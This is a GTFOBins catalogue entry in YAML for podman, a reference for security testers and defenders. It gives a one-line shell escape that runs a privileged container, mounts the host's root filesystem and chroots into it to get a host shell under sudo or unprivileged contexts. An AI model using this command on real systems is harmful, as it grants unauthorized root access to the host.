<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/podman -->
---
functions:
  shell:
  - code: |-
      podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
    comment: |-
      This requires an actual image to be available (e.g., `alpine`) downloading it if not present.
    contexts:
      sudo:
      unprivileged:
...
